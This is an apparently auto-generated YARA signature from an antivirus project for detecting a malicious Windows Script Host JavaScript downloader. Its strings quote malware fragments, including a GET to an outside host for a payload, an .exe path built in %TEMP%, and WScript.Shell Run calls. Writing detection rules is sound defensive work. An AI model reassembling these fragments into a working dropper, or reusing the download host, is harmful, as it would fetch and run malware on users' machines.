rule sig_20160328_f00286c80ccb9a973459da3633643e9e {
  meta:
    description = "datamaliciousorder - file 20160328_f00286c80ccb9a973459da3633643e9e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ed0276cd745ff0c346b3fd149492d7a5d0753a25e8ca5e447be305a6fd68f62"

  strings:
    $s1  = "function Qczmfu() {return Gfcfc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bBaLfcMrP83yK.exe\";};" fullword ascii
    $s2  = "Ljfrkxphit[Yvzfrsae](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Hrgeoeau](Pqwkwbs() * 11)} while (Ljfrkxphit[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Eihswz(Ipbttr, Lrejmn){return Ipbttr - Lrejmn;};" fullword ascii
    $s5  = "var Gfcfc = function Pkxydzr() {return WScript[Arbbyhz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Cksofluv(Fvfjn){Gfcfc[\"Run\"](Fvfjn, Qhesuvtz, Qhesuvtz);};" fullword ascii
    $s7  = "function Acitgesilc() {return ((Ecezytvn == true) && (Ecezytvn == Labpbioszq)) ? 1 : Qhesuvtz;};" fullword ascii
    $s8  = "function Leumzp(){return Arbbyhz;};" fullword ascii
    $s9  = "function Bslroyxu()" fullword ascii
    $s10 = "function Djhxrze(){return Hgkdovxeui;};" fullword ascii
    $s11 = " while (Lfttt){" fullword ascii
    $s12 = "var Tjvgybkl = new this[\"Date\"]();" fullword ascii
    $s13 = "Labpbioszq = true; " fullword ascii
    $s14 = "var Rlchxzpemr = false;" fullword ascii
    $s15 = "var Labpbioszq = false;" fullword ascii
    $s16 = "Ecezytvn = true; " fullword ascii
    $s17 = "function Mcphz(Jywvos) {var Cbvdrdm = (1, 2, 3, 4, 5, Jywvos); return Cbvdrdm;};" fullword ascii
    $s18 = "var Ecezytvn = false;" fullword ascii
    $s19 = "return Eihswz(Cdvotzwqyu, Zeofzbgtll);" fullword ascii
    $s20 = "function Pqwkwbs(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}